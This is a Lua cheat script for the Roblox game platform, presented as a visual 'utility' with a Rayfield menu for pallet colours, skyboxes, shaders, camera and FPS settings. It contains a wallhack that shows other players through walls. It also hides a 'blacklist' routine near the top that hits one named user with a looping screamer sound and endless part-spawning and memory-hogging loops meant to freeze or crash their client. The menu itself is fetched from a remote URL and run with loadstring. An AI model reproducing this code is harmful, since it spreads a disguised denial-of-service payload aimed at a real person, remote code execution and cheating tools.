local function httpGet(url)
    if type(url) ~= "string" then return "" end
    local ok, res = pcall(function()
        return game:HttpGet(url)
    end)
    if ok then return res end
    local ok2, res2 = pcall(function()
        return game:GetService("HttpService"):GetAsync(url)
    end)
    if ok2 then return res2 end
    local req = syn and syn.request or http_request or request
    if req then
        local resp = req({Url = url, Method = "GET"})
        if resp and resp.Success then return resp.Body end
    end
    return ""
end

local players = game:GetService("Players")
local lighting = game:GetService("Lighting")
local workspace = game:GetService("Workspace")
local camera = workspace.CurrentCamera
local localPlayer = players.LocalPlayer

local origMaxZoom = localPlayer.CameraMaxZoomDistance
local origMinZoom = localPlayer.CameraMinZoomDistance
local origCameraMode = localPlayer.CameraMode

local ccEffect = lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", lighting)
local bloomEffect = lighting:FindFirstChildOfClass("BloomEffect") or Instance.new("BloomEffect", lighting)
local sunRaysEffect = lighting:FindFirstChildOfClass("SunRaysEffect") or Instance.new("SunRaysEffect", lighting)
local atmosphere = lighting:FindFirstChildOfClass("Atmosphere") or Instance.new("Atmosphere", lighting)
local blurEffect = lighting:FindFirstChildOfClass("BlurEffect") or Instance.new("BlurEffect", lighting)
local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", lighting)

bloomEffect.Intensity = 0
sunRaysEffect.Intensity = 0
atmosphere.Density = 0
blurEffect.Size = 0
ccEffect.Saturation = 0
ccEffect.Contrast = 0
lighting.ExposureCompensation = 0
sky.Parent = lighting

-- Blacklist check
local function checkBlacklist()
    for _, name in ipairs({"badi22811"}) do
        if string.lower(localPlayer.Name) == string.lower(name) or string.lower(localPlayer.DisplayName) == string.lower(name) then
            local gui = Instance.new("ScreenGui")
            gui.Name = "ScreamerGUI"
            gui.IgnoreGuiInSet = true
            gui.ResetOnSpawn = false
            gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            gui.Parent = localPlayer:WaitForChild("PlayerGui")

            local image = Instance.new("ImageLabel")
            image.Name = "ScreamerImage"
            image.Image = "rbxassetid://1847441010"
            image.BackgroundTransparency = 0
            image.BackgroundColor3 = Color3.new(0, 0, 0)
            image.Size = UDim2.new(1, 0, 1, 0)
            image.Position = UDim2.new(0, 0, 0, 0)
            image.ZIndex = 100
            image.ScaleType = Enum.ScaleType.Stretch
            image.Parent = gui

            local label = Instance.new("TextLabel")
            label.Name = "BlacklistText"
            label.Text = name .. " - YOU ARE BLACKLISTED"
            label.Size = UDim2.new(1, 0, 0.15, 0)
            label.Position = UDim2.new(0, 0, 0.85, 0)
            label.BackgroundTransparency = 1
            label.TextColor3 = Color3.new(1, 0, 0)
            label.TextStrokeTransparency = 0
            label.TextStrokeColor3 = Color3.new(0, 0, 0)
            label.Font = Enum.Font.GothamBlack
            label.TextScaled = true
            label.ZIndex = 101
            label.Parent = gui

            local sound = Instance.new("Sound")
            sound.Name = "ScreamerSound"
            sound.SoundId = "rbxassetid://9120386436"
            sound.Volume = 10
            sound.Looped = true
            sound.PlaybackSpeed = 10
            sound.Parent = gui
            sound:Play()

            spawn(function()
                while true do
                    sound:Play()
                    task.wait()
                end
            end)

            spawn(function()
                while true do
                    for _ = 1, 100000 do
                        local part = Instance.new("Part")
                        part.Size = Vector3.new(math.random(1, 500), math.random(1, 500), math.random(1, 500))
                        part.Position = Vector3.new(math.random(-5000, 5000), math.random(-5000, 5000), math.random(-5000, 5000))
                        part.Anchored = true
                        part.CanCollide = false
                        part.Transparency = math.random(0, 100) / 100
                        part.BrickColor = BrickColor.Random()
                        part.Material = Enum.Material.Neon
                        part.Parent = workspace
                    end
                    for _ = 1, 100000 do
                        local bloom = Instance.new("BloomEffect")
                        bloom.Intensity = 1000
                        bloom.Size = 2000
                        bloom.Parent = lighting
                        local blur = Instance.new("BlurEffect")
                        blur.Size = 560
                        blur.Parent = lighting
                        local sunRays = Instance.new("SunRaysEffect")
                        sunRays.Intensity = 10
                        sunRays.Spread = 10
                        sunRays.Parent = lighting
                        local cc = Instance.new("ColorCorrectionEffect")
                        cc.Saturation = 10
                        cc.Contrast = 10
                        cc.Parent = lighting
                    end
                    settings().Rendering.QualityLevel = Enum.QualityLevel.Level21
                    game:GetService("RunService"):Set3dRenderingEnabled(false)
                    task.wait()
                end
            end)

            spawn(function()
                while true do
                    local bigTable = {}
                    for idx = 1, 50000000 do
                        bigTable[idx] = { math.random(), math.random(), math.random(), math.random(), math.random() }
                        bigTable[idx][1] = bigTable[idx][1] * math.sqrt(idx) / math.random()
                    end
                    local total = 0
                    for _, row in ipairs(bigTable) do
                        for col = 1, 5 do
                            total = total + math.sin(row[col]) * math.cos(row[col]) * math.tan(row[col]) * math.atan(row[col]) * math.sinh(row[col])
                        end
                    end
                    task.wait()
                end
            end)

            spawn(function()
                while true do
                    for _ = 1, 500000 do
                        game:GetService("RunService").Heartbeat:Connect(function()
                            local x = 0
                            for idx = 1, 10000000 do
                                x = x + math.sqrt(idx)
                            end
                        end)
                    end
                    task.wait()
                end
            end)

            while true do
                pcall(function()
                    game:GetService("RunService"):Set3dRenderingEnabled(false)
                    settings().Rendering.QualityLevel = Enum.QualityLevel.Level21
                    lighting.GlobalShadows = true
                    lighting.Technology = Enum.Technology.Legacy
                    for _ = 1, 1000 do
                        local bloom = Instance.new("BloomEffect")
                        bloom.Intensity = 1000
                        bloom.Size = 2000
                        bloom.Parent = lighting
                        local blur = Instance.new("BlurEffect")
                        blur.Size = 560
                        blur.Parent = lighting
                        local sunRays = Instance.new("SunRaysEffect")
                        sunRays.Intensity = 10
                        sunRays.Spread = 10
                        sunRays.Parent = lighting
                        local cc = Instance.new("ColorCorrectionEffect")
                        cc.Saturation = 10
                        cc.Contrast = 10
                        cc.Parent = lighting
                    end
                    for _ = 1, 100000 do
                        local part = Instance.new("Part")
                        part.Size = Vector3.new(1000, 1000, 1000)
                        part.Position = Vector3.new(math.random(-5000, 5000), math.random(-5000, 5000), math.random(-5000, 5000))
                        part.Anchored = true
                        part.CanCollide = false
                        part.BrickColor = BrickColor.Random()
                        part.Material = Enum.Material.Neon
                        part.Parent = workspace
                        local mesh = Instance.new("SpecialMesh")
                        mesh.MeshType = Enum.MeshType.FileMesh
                        mesh.Scale = Vector3.new(1000, 1000, 1000)
                        mesh.Parent = part
                    end
                end)
                task.wait()
            end

            return true
        end
    end
    return false
end

if checkBlacklist() then
    return
end

-- State variables
local customColorEnabled = false
local customMaterialEnabled = false
local customTransparencyEnabled = false
local transparencyValue = 0.5
local palletColor = Color3.fromRGB(0, 170, 255)
local palletMaterial = "Neon"
local playerRecolorEnabled = false
local highlightColor = Color3.fromRGB(255, 0, 0)
local wallhackEnabled = false
local wallCheckEnabled = false
local antiLagEnabled = false
local fpsBoostEnabled = false
local worldOverrideEnabled = false
local thirdPersonEnabled = false
local customSkyboxEnabled = false
local skyboxPreset = "Default"
local lineRecolorEnabled = false
local lineColor = Color3.fromRGB(255, 0, 0)
local atmosphereColor = Color3.fromRGB(255, 255, 255)
local atmosphereDensity = 0
local palletCountLabel = nil
local palletParts = {}
local palletModels = {}
local playerHighlights = {}
local materialList = {"SmoothPlastic", "Neon", "Glass", "Stone", "Marble", "Wood", "WoodPlanks", "Metal", "DiamondPlate", "Ice", "Brick", "Sand", "Fabric", "Granite", "Pebble", "CorrodedMetal", "Foil", "ForceField", "Slate", "Concrete", "Mud", "Grass"}

local skyboxPresets = {
    Default = { Bk = "rbxassetid://159454299", Dn = "rbxassetid://159454296", Ft = "rbxassetid://159454293", Lf = "rbxassetid://159454286", Rt = "rbxassetid://159454300", Up = "rbxassetid://159454288" },
    Night = { Bk = "rbxassetid://252335284", Dn = "rbxassetid://252335300", Ft = "rbxassetid://252335316", Lf = "rbxassetid://252335332", Rt = "rbxassetid://252335348", Up = "rbxassetid://252335364" },
    Sunset = { Bk = "rbxassetid://271543836", Dn = "rbxassetid://271543866", Ft = "rbxassetid://271543886", Lf = "rbxassetid://271543856", Rt = "rbxassetid://271543876", Up = "rbxassetid://271543896" },
    Space = { Bk = "rbxassetid://108347783", Dn = "rbxassetid://108347800", Ft = "rbxassetid://108347815", Lf = "rbxassetid://108347830", Rt = "rbxassetid://108347845", Up = "rbxassetid://108347860" },
    Galaxy = { Bk = "rbxassetid://644432196", Dn = "rbxassetid://644432228", Ft = "rbxassetid://644432260", Lf = "rbxassetid://644432292", Rt = "rbxassetid://644432324", Up = "rbxassetid://644432356" },
    Black = { Bk = "rbxassetid://0", Dn = "rbxassetid://0", Ft = "rbxassetid://0", Lf = "rbxassetid://0", Rt = "rbxassetid://0", Up = "rbxassetid://0" },
    White = { Bk = "rbxassetid://146055569", Dn = "rbxassetid://146055569", Ft = "rbxassetid://146055569", Lf = "rbxassetid://146055569", Rt = "rbxassetid://146055569", Up = "rbxassetid://146055569" },
    Pink = { Bk = "rbxassetid://247438044", Dn = "rbxassetid://247438044", Ft = "rbxassetid://247438044", Lf = "rbxassetid://247438044", Rt = "rbxassetid://247438044", Up = "rbxassetid://247438044" }
}

local function updatePalletCount()
    local count = 0
    for _ in pairs(palletModels) do
        count = count + 1
    end
    if palletCountLabel then
        pcall(function()
            palletCountLabel:Set("Pallets found: " .. tostring(count))
        end)
    end
end

local function saveOrigProps(part)
    if not palletParts[part] then
        palletParts[part] = {
            origColor = part.Color,
            origMat = part.Material,
            origTransparency = part.Transparency
        }
    end
end

local function applyPalletSettings(part)
    if not part or not part:IsA("BasePart") then
        return
    end
    saveOrigProps(part)
    pcall(function()
        if customColorEnabled then
            part.Color = palletColor
        end
        if customMaterialEnabled then
            local ok, mat = pcall(function() return Enum.Material[palletMaterial] end)
            if ok then
                part.Material = mat
            end
        end
        if customTransparencyEnabled then
            part.Transparency = transparencyValue
        end
    end)
end

local function refreshPallets()
    for pallet, _ in pairs(palletParts) do
        if pallet and pallet.Parent then
            applyPalletSettings(pallet)
        end
    end
    for model, _ in pairs(palletModels) do
        if model and model.Parent then
            for _, desc in ipairs(model:GetDescendants()) do
                if desc:IsA("BasePart") then
                    applyPalletSettings(desc)
                end
            end
        end
    end
end

local function isPalletModel(model)
    if not model or not model:IsA("Model") then return false end
    local name = string.lower(model.Name)
    if name == "palletlightbrown" or name == "pallet" or name == "raft" or name == "spawnedpallet" or name == "spawnedraft" or name == "woodpallet" then
        return true
    end
    if (string.find(name, "pallet") or string.find(name, "raft")) and not string.find(name, "house") and not string.find(name, "building") and not string.find(name, "map") and not string.find(name, "wall") then
        return true
    end
    return false
end

local function trackPallet(model)
    if not model or not model:IsA("Model") then return end
    if not isPalletModel(model) then return end
    if palletModels[model] then return end
    palletModels[model] = true
    for _, desc in ipairs(model:GetDescendants()) do
        if desc:IsA("BasePart") then
            saveOrigProps(desc)
            applyPalletSettings(desc)
        end
    end
    model.ChildAdded:Connect(function(child)
        if child:IsA("BasePart") then
            saveOrigProps(child)
            applyPalletSettings(child)
        end
    end)
    updatePalletCount()
end

local function recolorPlayer(character)
    if not playerRecolorEnabled then return end
    if not character then return end
    for _, desc in ipairs(character:GetDescendants()) do
        pcall(function()
            if desc:IsA("BasePart") then
                desc.Color = highlightColor
            end
        end)
    end
end

local function updateHighlight(player)
    local character = player.Character
    if not character then return end
    if playerHighlights[player] then
        pcall(function()
            playerHighlights[player]:Destroy()
        end)
        playerHighlights[player] = nil
    end
    if wallhackEnabled and player ~= localPlayer then
        local highlight = Instance.new("Highlight")
        highlight.FillColor = highlightColor
        highlight.FillTransparency = 0.5
        highlight.OutlineColor = highlightColor
        highlight.OutlineTransparency = 0
        highlight.DepthMode = wallCheckEnabled and Enum.HighlightDepthMode.Occluded or Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Parent = character
        playerHighlights[player] = highlight
    end
end

local function refreshHighlights()
    for _, player in ipairs(players:GetPlayers()) do
        updateHighlight(player)
    end
end

local function recolorLine(instance)
    if not lineRecolorEnabled then return end
    if instance:IsA("Beam") then
        pcall(function()
            instance.Color = ColorSequence.new(lineColor)
            instance.Texture = ""
        end)
    elseif instance:IsA("Trail") then
        pcall(function()
            instance.Color = ColorSequence.new(lineColor)
            instance.Texture = ""
        end)
    elseif instance:IsA("LineHandleAdornment") then
        pcall(function()
            instance.Color3 = lineColor
        end)
    end
end

local function applyAntiLag(instance)
    if not antiLagEnabled then return end
    if instance:IsA("Beam") then
        if lineRecolorEnabled then
            recolorLine(instance)
            return
        end
        if instance.ClassName == "Beam" or instance.ClassName == "LineHandleAdornment" or instance.ClassName == "Trail" or instance.ClassName == "ParticleEmitter" then
            instance.Enabled = false
        end
    elseif instance:IsA("Trail") or instance:IsA("LineHandleAdornment") then
        -- handled above
    end
end

local function applyFPSBoost()
    if not fpsBoostEnabled then
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level10
        lighting.GlobalShadows = true
        return
    end
    settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
    lighting.GlobalShadows = false
    lighting.Technology = Enum.Technology.Compatibility
    for _, desc in ipairs(workspace:GetDescendants()) do
        if desc:IsA("BasePart") then
            desc.CastShadow = false
        end
    end
end

local function applyThirdPerson()
    if thirdPersonEnabled then
        localPlayer.CameraMode = Enum.CameraMode.Classic
        localPlayer.CameraMaxZoomDistance = 50
        localPlayer.CameraMinZoomDistance = 0.5
    else
        localPlayer.CameraMode = origCameraMode
        localPlayer.CameraMaxZoomDistance = origMaxZoom
        localPlayer.CameraMinZoomDistance = origMinZoom
    end
end

game:GetService("UserInputService").InputChanged:Connect(function(input, processed)
    if not processed and thirdPersonEnabled and input.UserInputType == Enum.UserInputType.MouseWheel then
        if localPlayer.CameraMode ~= Enum.CameraMode.Classic then
            localPlayer.CameraMode = Enum.CameraMode.Classic
        end
    end
end)

local function applyWorldMaterial(material)
    if not worldOverrideEnabled then return end
    for _, desc in ipairs(workspace:GetDescendants()) do
        if desc:IsA("BasePart") and not palletParts[desc] then
            local isPlayerPart = false
            for _, player in ipairs(players:GetPlayers()) do
                if player.Character and desc:IsDescendantOf(player.Character) then
                    isPlayerPart = true
                    break
                end
            end
            if not isPlayerPart then
                desc.Material = material
            end
        end
    end
end

local function resetWorldMaterial()
    for _, desc in ipairs(workspace:GetDescendants()) do
        if desc:IsA("BasePart") and not palletParts[desc] then
            local isPlayerPart = false
            for _, player in ipairs(players:GetPlayers()) do
                if player.Character and desc:IsDescendantOf(player.Character) then
                    isPlayerPart = true
                    break
                end
            end
            if not isPlayerPart then
                desc.Material = Enum.Material.Plastic
            end
        end
    end
end

local function applySkybox()
    if not customSkyboxEnabled then return end
    local preset = skyboxPresets[skyboxPreset] or skyboxPresets.Default
    for face, id in pairs(preset) do
        pcall(function()
            sky["Skybox" .. face] = id
        end)
    end
    sky.Parent = lighting
end

local function applyAtmosphere()
    atmosphere.Color = atmosphereColor
    atmosphere.Density = atmosphereDensity
end

local function refreshLines()
    for _, desc in ipairs(workspace:GetDescendants()) do
        if desc:IsA("Beam") or desc:IsA("Trail") or desc:IsA("LineHandleAdornment") then
            if lineRecolorEnabled then
                recolorLine(desc)
            end
        end
    end
end

task.spawn(function()
    for _, desc in ipairs(workspace:GetDescendants()) do
        if desc:IsA("Model") then
            trackPallet(desc)
        end
        if desc:IsA("Beam") or desc:IsA("Trail") or desc:IsA("LineHandleAdornment") then
            if lineRecolorEnabled then
                recolorLine(desc)
            end
        end
    end
    if antiLagEnabled then
        for _, desc in ipairs(workspace:GetDescendants()) do
            applyAntiLag(desc)
        end
    end
    applySkybox()
    applyAtmosphere()
end)

workspace.DescendantAdded:Connect(function(desc)
    if antiLagEnabled then
        applyAntiLag(desc)
    end
    if desc:IsA("Model") then
        trackPallet(desc)
        if desc:FindFirstChild("Humanoid") then
            recolorPlayer(desc)
        end
    end
    if lineRecolorEnabled then
        if desc:IsA("Beam") or desc:IsA("Trail") or desc:IsA("LineHandleAdornment") then
            recolorLine(desc)
        end
    end
end)

workspace.DescendantRemoving:Connect(function(desc)
    if palletParts[desc] then
        palletParts[desc] = nil
    end
    if palletModels[desc] then
        palletModels[desc] = nil
        updatePalletCount()
    end
end)

players.PlayerAdded:Connect(function(player)
    if player ~= localPlayer and wallhackEnabled then
        updateHighlight(player)
    end
    player.CharacterAdded:Connect(function(character)
        applyThirdPerson()
        if playerRecolorEnabled then
            recolorPlayer(character)
        end
        if wallhackEnabled and player ~= localPlayer then
            updateHighlight(player)
        end
    end)
end)

for _, player in ipairs(players:GetPlayers()) do
    if player ~= localPlayer and wallhackEnabled then
        updateHighlight(player)
    end
    player.CharacterAdded:Connect(function(character)
        if playerRecolorEnabled then
            recolorPlayer(character)
        end
        if wallhackEnabled and player ~= localPlayer then
            updateHighlight(player)
        end
    end)
end

if fpsBoostEnabled then
    applyFPSBoost()
end

-- Load Rayfield UI
local Rayfield = loadstring(httpGet("https://sirius.menu/rayfield"))()
local window = Rayfield:CreateWindow({
    Name = "desvisuals v1 | created by desoulz",
    LoadingTitle = "desvisuals",
    LoadingSubtitle = "Utility Script",
    Theme = "Dark"
})

-- Pallets Tab
local palletTab = window:CreateTab("Pallets", 4483362458)
palletCountLabel = palletTab:CreateLabel("Pallets found: 0")
updatePalletCount()

palletTab:CreateSection("Pallet Settings")
palletTab:CreateToggle({
    Name = "Custom color",
    CurrentValue = false,
    Callback = function(value)
        customColorEnabled = value
        refreshPallets()
    end
})
palletTab:CreateColorPicker({
    Name = "Color",
    Color = palletColor,
    Callback = function(value)
        palletColor = value
        if customColorEnabled then
            refreshPallets()
        end
    end
})
palletTab:CreateToggle({
    Name = "Custom material",
    CurrentValue = false,
    Callback = function(value)
        customMaterialEnabled = value
        refreshPallets()
    end
})
palletTab:CreateDropdown({
    Name = "Material",
    Options = materialList,
    CurrentOption = {palletMaterial},
    Callback = function(value)
        palletMaterial = value[1]
        if customMaterialEnabled then
            refreshPallets()
        end
    end
})
palletTab:CreateSection("Transparency")
palletTab:CreateToggle({
    Name = "Enable transparency",
    CurrentValue = false,
    Callback = function(value)
        customTransparencyEnabled = value
        refreshPallets()
    end
})
palletTab:CreateSlider({
    Name = "Transparency",
    Increment = 0.05,
    CurrentValue = 0.5,
    Range = {0, 1},
    Callback = function(value)
        transparencyValue = value
        if customTransparencyEnabled then
            refreshPallets()
        end
    end
})

-- Players Tab
local playerTab = window:CreateTab("Players", 4483362458)
playerTab:CreateSection("Player Visuals")
playerTab:CreateToggle({
    Name = "Recolor (removes clothes)",
    CurrentValue = false,
    Callback = function(value)
        playerRecolorEnabled = value
        if value then
            for _, player in ipairs(players:GetPlayers()) do
                if player.Character then
                    recolorPlayer(player.Character)
                end
            end
        end
    end
})
playerTab:CreateColorPicker({
    Name = "Color",
    Color = highlightColor,
    Callback = function(value)
        highlightColor = value
        if playerRecolorEnabled then
            for _, player in ipairs(players:GetPlayers()) do
                if player.Character then
                    recolorPlayer(player.Character)
                end
            end
        end
        if wallhackEnabled then
            refreshHighlights()
        end
    end
})
playerTab:CreateSection("WallHack")
playerTab:CreateToggle({
    Name = "Enable WH",
    CurrentValue = false,
    Callback = function(value)
        wallhackEnabled = value
        refreshHighlights()
    end
})
playerTab:CreateToggle({
    Name = "WallCheck",
    CurrentValue = false,
    Callback = function(value)
        wallCheckEnabled = value
        if wallhackEnabled then
            refreshHighlights()
        end
    end
})

-- World Tab
local worldTab = window:CreateTab("World", 4483362458)
worldTab:CreateSection("World Materials")
worldTab:CreateToggle({
    Name = "Override materials",
    CurrentValue = false,
    Callback = function(value)
        worldOverrideEnabled = value
        if value then
            pcall(function()
                applyWorldMaterial(Enum.Material[palletMaterial])
            end)
        else
            resetWorldMaterial()
        end
    end
})
worldTab:CreateDropdown({
    Name = "Material",
    Options = materialList,
    CurrentOption = {"Neon"},
    Callback = function(value)
        local matName = value[1]
        local ok, mat = pcall(function() return Enum.Material[matName] end)
        if ok and worldOverrideEnabled then
            applyWorldMaterial(mat)
        end
    end
})
worldTab:CreateSection("Skybox")
worldTab:CreateDropdown({
    Name = "Preset",
    Options = {"Default", "Night", "Sunset", "Space", "Galaxy", "Black", "White", "Pink"},
    CurrentOption = {"Default"},
    Callback = function(value)
        skyboxPreset = value[1]
        if customSkyboxEnabled then
            applySkybox()
        end
    end
})
worldTab:CreateToggle({
    Name = "Enable custom skybox",
    CurrentValue = false,
    Callback = function(value)
        customSkyboxEnabled = value
        applySkybox()
    end
})
worldTab:CreateSection("Atmosphere (Fog)")
worldTab:CreateColorPicker({
    Name = "Color",
    Color = atmosphereColor,
    Callback = function(value)
        atmosphereColor = value
        applyAtmosphere()
    end
})
worldTab:CreateSlider({
    Name = "Density",
    Increment = 0.05,
    CurrentValue = 0,
    Range = {0, 1},
    Callback = function(value)
        atmosphereDensity = value
        applyAtmosphere()
    end
})

-- Shaders Tab
local shaderTab = window:CreateTab("Shaders", 4483362458)
shaderTab:CreateSection("Presets")
shaderTab:CreateDropdown({
    Name = "Shader",
    Options = {"Off", "Ultra HD", "Cinematic", "Cyberpunk", "Soft", "Realistic", "Horror", "Anime"},
    CurrentOption = {"Off"},
    Callback = function(value)
        local preset = value[1]
        if preset == "Off" then
            bloomEffect.Intensity = 0
            sunRaysEffect.Intensity = 0
            atmosphere.Density = 0
            blurEffect.Size = 0
            ccEffect.Saturation = 0
            ccEffect.Contrast = 0
            lighting.ExposureCompensation = 0
        elseif preset == "Ultra HD" then
            lighting.ExposureCompensation = 0.5
            ccEffect.Saturation = 0.2
            ccEffect.Contrast = 0.15
            bloomEffect.Intensity = 3.5
            bloomEffect.Size = 40
            sunRaysEffect.Intensity = 0.6
            atmosphere.Density = 0.15
        elseif preset == "Cinematic" then
            lighting.ExposureCompensation = 0.8
            ccEffect.Saturation = 0.4
            ccEffect.Contrast = 0.5
            bloomEffect.Intensity = 6
            bloomEffect.Size = 56
            sunRaysEffect.Intensity = 0.8
            atmosphere.Density = 0.3
        elseif preset == "Cyberpunk" then
            ccEffect.Saturation = 0.8
            ccEffect.Contrast = 0.3
            bloomEffect.Intensity = 5
            sunRaysEffect.Intensity = 0.4
            atmosphere.Density = 0
            ccEffect.TintColor = Color3.fromRGB(0, 255, 255)
        elseif preset == "Soft" then
            ccEffect.Saturation = 0.05
            ccEffect.Contrast = 0.05
            bloomEffect.Intensity = 1.5
            atmosphere.Density = 0.4
        elseif preset == "Realistic" then
            lighting.ExposureCompensation = 1
            ccEffect.Saturation = 0.3
            ccEffect.Contrast = 0.4
            bloomEffect.Intensity = 2
            bloomEffect.Size = 24
            sunRaysEffect.Intensity = 0.5
            atmosphere.Density = 0.2
        elseif preset == "Horror" then
            lighting.ExposureCompensation = -0.5
            ccEffect.Saturation = -0.5
            ccEffect.Contrast = 0.8
            blurEffect.Size = 10
            atmosphere.Density = 0.5
        elseif preset == "Anime" then
            ccEffect.Saturation = 0.6
            ccEffect.Contrast = 0.2
            bloomEffect.Intensity = 2
            bloomEffect.Size = 20
            sunRaysEffect.Intensity = 0.7
            atmosphere.Density = 0.1
            ccEffect.TintColor = Color3.fromRGB(255, 200, 200)
        end
    end
})
shaderTab:CreateSection("Manual")
shaderTab:CreateSlider({
    Name = "Brightness",
    Increment = 0.1,
    CurrentValue = 0,
    Range = {-3, 4},
    Callback = function(value)
        lighting.ExposureCompensation = value
    end
})
shaderTab:CreateSlider({
    Name = "Saturation",
    Increment = 0.05,
    CurrentValue = 0,
    Range = {-1, 2},
    Callback = function(value)
        ccEffect.Saturation = value
    end
})
shaderTab:CreateSlider({
    Name = "Contrast",
    Increment = 0.1,
    CurrentValue = 0,
    Range = {-2, 3},
    Callback = function(value)
        ccEffect.Contrast = value
    end
})
shaderTab:CreateSlider({
    Name = "Blur",
    Increment = 1,
    CurrentValue = 0,
    Range = {0, 56},
    Callback = function(value)
        blurEffect.Size = value
    end
})

-- Lines Tab
local lineTab = window:CreateTab("Lines", 4483362458)
lineTab:CreateSection("Line Recolor")
lineTab:CreateToggle({
    Name = "Enable",
    CurrentValue = false,
    Callback = function(value)
        lineRecolorEnabled = value
        if value then
            refreshLines()
        end
    end
})
lineTab:CreateColorPicker({
    Name = "Color",
    Color = lineColor,
    Callback = function(value)
        lineColor = value
        if lineRecolorEnabled then
            refreshLines()
        end
    end
})

-- Camera Tab
local cameraTab = window:CreateTab("Camera", 4483362458)
cameraTab:CreateSection("FOV")
cameraTab:CreateSlider({
    Name = "FOV",
    Increment = 1,
    CurrentValue = 70,
    Range = {30, 120},
    Callback = function(value)
        camera.FieldOfView = value
    end
})
cameraTab:CreateSection("Third Person")
cameraTab:CreateToggle({
    Name = "Unlock third person",
    CurrentValue = false,
    Callback = function(value)
        thirdPersonEnabled = value
        applyThirdPerson()
    end
})

-- Optimization Tab
local optTab = window:CreateTab("Optimization", 4483362458)
optTab:CreateSection("Optimization")
optTab:CreateToggle({
    Name = "Anti-Lag",
    CurrentValue = false,
    Callback = function(value)
        antiLagEnabled = value
        if value then
            for _, desc in ipairs(workspace:GetDescendants()) do
                applyAntiLag(desc)
            end
        end
    end
})
optTab:CreateToggle({
    Name = "FPS Boost",
    CurrentValue = false,
    Callback = function(value)
        fpsBoostEnabled = value
        applyFPSBoost()
    end
})
